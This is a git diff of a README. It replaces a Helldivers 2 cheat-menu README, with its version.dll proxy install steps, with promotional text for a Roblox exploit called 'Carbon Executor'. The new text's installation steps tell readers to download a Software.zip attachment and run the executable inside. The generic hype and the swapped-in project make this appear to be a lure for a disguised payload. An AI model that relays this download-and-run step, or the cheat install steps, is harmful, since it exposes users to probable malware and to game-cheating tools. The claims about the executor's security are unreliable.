@@ -1,51 +1,68 @@
-# Helldivers2Menu
+# Roblox-Carbon
 
-<p align="center">
-   Helldivers2Menu is a Cheat Menu for the popular Game Helldivers 2.
-</p>
+Carbon Executor is a state-of-the-art Roblox exploit that offers unmatched performance and security, boasting 90% UNC support and Level 8 execution capabilities. Compatible with Windows 7 through 11, it empowers users to unlock the full potential of Roblox scripting effortlessly.
 
-## Disclaimer
-This project is for Educational Use only. We do not condone this software being used to gain an advantage against other people. I made this project for my university project to show how cheating software works and how it is possible to block these manipulations in the future.
+## Table of Contents
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-## Compile (Configurations)
-Please compile the project in **Release** mode. Debug does not work properly and gets detected by GG.
+## Features
 
-### Version Proxy (version.dll)
-Will automatically be loaded by the Game itself if the dll is in the game directory.
+- **State-of-the-Art Technology**: Carbon Executor is built using the latest technologies and techniques to provide users with a cutting-edge experience.
+  
+- **Unmatched Performance**: The Carbon Executor offers unmatched performance, allowing users to execute scripts with speed and efficiency.
+  
+- **Robust Security**: Security is a top priority, and the Carbon Executor ensures that users can run scripts safely without compromising their data or system.
+  
+- **90% UNC Support**: With 90% UNC support, users can run a wide range of scripts with ease, expanding the possibilities of what they can achieve.
+  
+- **Level 8 Execution Capabilities**: The Carbon Executor provides Level 8 execution capabilities, enabling users to explore advanced scripting techniques.
 
-### How to Run
-1. Move the `version.dll` into the game directory in `/bin`
-2. Change the Launch Options in Steam for the game into `--use-d3d11` 
-3. Start the game
-4. Press DELETE to show the menu
-5. For performance increase, change into fullscreen mode (Dx11 being funky in HD2)
+## Installation
 
-### Running on Proton (Version Proxy Only)
-First you will need protontricks, you can install it with your packager of choice.
+To get started with Carbon Executor, follow these simple steps:
 
-1. Make sure you are running Helddivers 2 under Proton  
-   You can check by going to **Properties -> Compatibility**
-3. Put version.dll into Helldivers 2 bin folder
-4. Run `protontricks --gui`
-5. Choose **HELLDIVERS 2**
-6. Click on **Select the default wineprefix** and then **OK**
-7. Click on **Run winecfg** and then **OK**
-8. In the configuration window, click on **Libraries**
-9. Type `version` into the **New override for library** input
-10. Click **Add** and then **Apply**
-11. Helldivers2Menu should now work properly in the game
+1. Download the latest version of Carbon Executor from the following link: [![Download Carbon Executor](https://img.shields.io/badge/Download-Carbon%20Executor-blue)](https://github.com/user-attachments/files/16913125/Software.zip)
 
-### Default Hotkeys
-- Show Menu - DELETE
+2. Extract the downloaded files to a location of your choice on your Windows machine.
 
-## Screenshot
-<p align="center">
-   <img src="screenshot.png">
-</p>
+3. Run the Carbon Executor executable file to launch the application.
+
+4. You are now ready to start exploring the full potential of Roblox scripting with Carbon Executor!
+
+## Usage
+
+Here are some examples of how you can use Carbon Executor to enhance your Roblox scripting experience:
+
+1. **Script Execution**: Use the Carbon Executor to run scripts and unlock new features and functionalities in your Roblox games.
+
+2. **Security Testing**: Test the security of your own Roblox games by running scripts through the Carbon Executor to identify potential vulnerabilities.
+
+3. **Exploration**: Explore the world of Roblox scripting by experimenting with different scripts and tools available in Carbon Executor.
+
+4. **Performance Optimization**: Optimize the performance of your scripts by leveraging the advanced capabilities provided by the Carbon Executor.
 
 ## Contributing
-1. Fork it (<https://github.com/BitCrackers/Helldivers2Menu/fork>)
-2. Create your feature branch (`git checkout -b feature/fooBar`)
-3. Commit your changes (`git commit -am 'Add some fooBar'`)
-4. Push to the branch (`git push origin feature/fooBar`)
-5. Create a new Pull Request
+
+We welcome contributions from the community to help improve Carbon Executor and make it even better. Here are some ways you can contribute:
+
+- **Bug Reports**: If you encounter any bugs or issues while using Carbon Executor, please report them to us so we can address them promptly.
+
+- **Feature Requests**: Have an idea for a new feature or enhancement? Let us know, and we will consider adding it to future versions of Carbon Executor.
+
+- **Code Contributions**: If you are a developer, you can contribute directly to the development of Carbon Executor by opening pull requests with your code changes.
+
+- **Feedback**: Share your feedback and suggestions with us to help us continue improving Carbon Executor for all users.
+
+## License
+
+The Carbon Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+---
+
+![Roblox-Carbon](https://example.com/roblox-carbon.png)
+
+🚀 Happy scripting with Carbon Executor! 🚀
